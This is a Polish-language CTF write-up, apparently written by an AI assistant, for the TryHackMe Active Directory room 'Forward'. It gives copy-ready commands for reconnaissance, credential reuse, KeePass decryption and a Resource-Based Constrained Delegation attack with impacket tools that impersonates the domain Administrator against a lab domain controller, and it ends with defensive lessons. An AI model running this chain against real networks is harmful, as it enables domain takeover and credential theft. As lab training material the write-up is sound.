---

Oto kompletne podsumowanie i uporządkowana notatka z ćwiczenia **Forward [Initial Access Granted]** na platformie TryHackMe. Ściąga została przygotowana w taki sposób, abyś mógł w przyszłości odtworzyć ten atak samodzielnie krok po kroku.

---

📝 Raport i Ściąga CTF: Active Directory – Pokój "Forward"

- **Środowisko:** `ctf.local`
- **Cel:** Eskalacja uprawnień od zwykłego użytkownika domenowego do Domain Admina (Pełna kompromitacja DC01).
- **Adres IP Maszyny:** `10.128.191.177` (wstaw własne IP podczas kolejnej próby)

---

🗺️ Przebieg Ataku (Etapy)

1. **Rekonesans Sieciowy:** Identyfikacja otwartych usług (filtracja WinRM, otwarte SMB/LDAP).
2. **Dostęp Początkowy & Lateral Movement 1:** Logowanie przez RDP na konto `j.smith`, odnalezienie i odszyfrowanie bazy haseł KeePass powiązanej z sesją użytkownika Windows.
3. **Lateral Movement 2 (Password Reuse):** Przejęcie konta `t.jones` i identyfikacja kolejnego konta `r.williams` z identycznym hasłem.
4. **Eskalacja Uprawnień (RBCD):** Wykorzystanie uprawnień `r.williams` (grupa `sysadmin`) do modyfikacji delegacji (Resource-Based Constrained Delegation) na Kontrolerze Domeny.
5. **Przejęcie Kontrolera Domeny (Domain Admin):** Wygenerowanie biletu Kerberos (S4U2Proxy) dla konta `Administrator`, zdalny montaż dysku `C$` i odczyt flagi.

---

🛠️ Komendy Krok po Kroku (Wersja do Skopiowania)

Krok 1: Wstępne skanowanie i weryfikacja poświadczeń

Weryfikacja dostępnych portów oraz sprawdzenie, czy posiadane hasło początkowe działa w sieci.

bash

```
# 1. Skanowanie portów (WinRM 5985 okazał się filtrowany, SMB 445 otwarty)
nmap -p 389,445,5985 10.128.191.177

# 2. Weryfikacja poświadczeń j.smith przez SMB
crackmapexec smb 10.128.191.177 -u j.smith -p 'JSmith@IT2024'

# 3. Sprawdzenie dostępnych udziałów sieciowych SMB
smbclient -L //10.128.191.177/ -U ctf.local/j.smith%'JSmith@IT2024'
```

Krok 2: Pozyskanie bazy KeePass i konta `t.jones`

Logowanie graficzne na maszynę i odnalezienie bazy danych haseł.

bash

```
# 1. Połączenie przez Pulpit Zdalny (RDP) jako j.smith
xfreerdp /v:10.128.191.177 /u:j.smith /p:JSmith@IT2024 /dynamic-resolution /cert:ignore

# 2. Wyszukanie plików baz haseł w PowerShell na Windowsie
Get-ChildItem -Path C:\ -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue

# 3. OTWARCIE BAZY (Kluczowy moment): 
# Otwieramy plik C:\Users\j.smith\Documents\Database.kdbx w programie KeePass2 na Windowsie.
# Zostawiamy hasło puste, zaznaczamy opcję "Windows User Account" -> Wyciągamy hasło dla t.jones: Helpdesk01!
```

Krok 3: Rekonesans AD i przejęcie konta `r.williams`

Badanie uprawnień nowo zdobytej tożsamości oraz "Password Spraying".

bash

```
# 1. Sprawdzenie szczegółów konta t.jones
rpcclient -U "ctf.local/t.jones%Helpdesk01!" 10.128.191.177 -c "queryuser t.jones"

# 2. Przeszukanie LDAP w celu znalezienia grup i uprawnień użytkownika r.williams
ldapsearch -H ldap://10.128.191.177 -x -D "t.jones@ctf.local" -w "Helpdesk01!" -b "DC=ctf,DC=local" "(sAMAccountName=r.williams)"
# (Wynik wskazał, że r.williams należy do ważnej grupy 'sysadmin')

# 3. Test Password Reuse – sprawdzenie, czy r.williams ma to samo hasło co t.jones
crackmapexec smb 10.128.191.177 -u r.williams -p 'Helpdesk01!'
```

Używaj kodu z rozwagą.

Krok 4: Atak Delegacji RBCD (Główny exploit)

Wykorzystanie konta `r.williams` (grupa `sysadmin`) do zaufania własnej, nowo dodanej maszynie.

bash

```
# 1. Dodanie konfiguracji DNS do pliku /etc/hosts (Wymagane, aby Kerberos działał po nazwie)
echo "10.128.191.177 DC01.ctf.local DC01" >> /etc/hosts

# 2. Dodanie nowego konta komputera (ATTACKCOMP$) do domeny
addcomputer.py -computer-name 'ATTACKCOMP$' -computer-pass 'CompPass123!' -dc-ip 10.128.191.177 ctf.local/r.williams:'Helpdesk01!'

# 3. Nadanie uprawnień delegacji (RBCD) dla nowej maszyny wobec serwera DC01$
rbcd.py -delegate-to 'DC01$' -delegate-from 'ATTACKCOMP$' -action 'write' -dc-ip 10.128.191.177 ctf.local/r.williams:'Helpdesk01!'
```

Używaj kodu z rozwagą.

Krok 5: Generowanie biletu i odczyt flagi Domain Admina

Wykorzystanie mechanizmu S4U2Proxy w celu sfałszowania tożsamości Administratora.

bash

```
# 1. Zażądanie biletu Kerberos (TGS) dla usługi cifs (SMB) jako Administrator domeny
getST.py -dc-ip 10.128.191.177 -spn cifs/DC01.ctf.local ctf.local/ATTACKCOMP\$:'CompPass123!' -impersonate Administrator

# 2. Załadowanie wygenerowanego biletu do pamięci bieżącej sesji terminala Linux
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache

# 3. Zdalne połączenie z dyskiem administratora za pomocą załadowanego biletu
smbclient.py -k -no-pass DC01.ctf.local

# Wewnątrz interaktywnej konsoli Impacket-SMB:
use C$
cd Users\Administrator\Desktop
ls
get flag.txt
exit

# 4. Wyświetlenie ostatecznej flagi na Linuxie
cat flag.txt
```

Używaj kodu z rozwagą.

---

💡 Kluczowe Wnioski i Lekcje Obronne (Cybersecurity Takeaways)

1. **Nie łącz bazy KeePass z kontem Windows (Windows User Account)** w środowiskach wieloużytkownikowych – jeśli napastnik uzyska dostęp do sesji (np. przez RDP), odszyfruje bazę bez znajomości hasła głównego.
2. **Unikaj ponownego używania haseł (Password Reuse)** – tożsamości w obrębie jednego działu (Helpdesk) nie powinny dzielić tych samych sekretów.
3. **Zasada minimalnych uprawnień (Least Privilege)** – grupy takie jak `sysadmin` lub `Helpdesk` nie powinny posiadać domyślnych uprawnień zapisu (`GenericWrite`/`WriteDacl`) do obiektów komputerowych kontrolerów domeny, aby unikać ataków typu RBCD.

Zapisz sobie tę notatkę. Przyda Ci się w niemal każdym kolejnym pokoju z tematyki Active Directory! Co robimy dalej – **szukasz kolejnego pokoju AD**, czy chcesz omówić dokładniej któryś z powyższych kroków?
